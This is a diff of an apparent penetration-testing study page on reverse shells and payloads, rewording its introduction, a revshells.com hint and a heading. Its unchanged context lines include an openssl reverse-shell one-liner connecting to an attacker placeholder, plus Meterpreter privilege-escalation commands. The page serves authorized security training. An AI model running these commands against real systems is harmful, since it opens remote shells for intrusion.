@@ -1,6 +1,6 @@
 # Shells & Payloads
 
-How you turn code execution into an interactive session, and how you make that session usable. Every foothold on the PNPT — a web RCE, an exploited service, a phishing payload — lands you here first. Get a stable shell, upgrade it to a real TTY, then move on to enumeration, [privesc](linux-privesc-methodology.md), and [credential dumping](credential-dumping.md).
+This page covers turning code execution into an interactive session and making that session usable. A web RCE, exploited service, or authorized phishing payload often lands here first. Stabilize the shell, upgrade it to a real TTY, then move on to enumeration, [privilege escalation](linux-privesc-methodology.md), and [credential dumping](credential-dumping.md).
 
 {% hint style="warning" %}
 Set up your listener **before** you fire the payload. A reverse shell that connects back to a closed port dies silently and you'll waste time wondering why the exploit "failed". Confirm the listener is bound (`ss -tlnp`) first.
@@ -142,7 +142,7 @@ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTA
 ```
 
 {% hint style="info" %}
-[revshells.com](https://www.revshells.com/) generates any of these with your IP/port filled in and the right URL-encoding for the delivery context. Great under exam time pressure — but understand the payload before you paste it.
+[revshells.com](https://www.revshells.com/) generates these payloads with your IP and port filled in and the appropriate URL encoding for the delivery context. Understand the payload and review generated code before running it.
 {% endhint %}
 
 ## Bind shells
@@ -329,7 +329,7 @@ getsystem                    # attempt SYSTEM
 use post/multi/recon/local_exploit_suggester   # find privesc exploits
 ```
 
-## Field notes (things that bite under exam pressure)
+## Field notes and common failure modes
 
 * **ELF fails silently?** Some contexts (Java `Runtime.exec()`, MDA subshells) break small ELF reverse shells even when they transfer cleanly. Switch to `cmd/unix/reverse_bash` (bash handles stdio inheritance predictably) or a Python one-liner.
 * **Egress ports:** test which outbound ports are open before wondering why a shell hangs. Common winners: 80, 443, 21, 53.
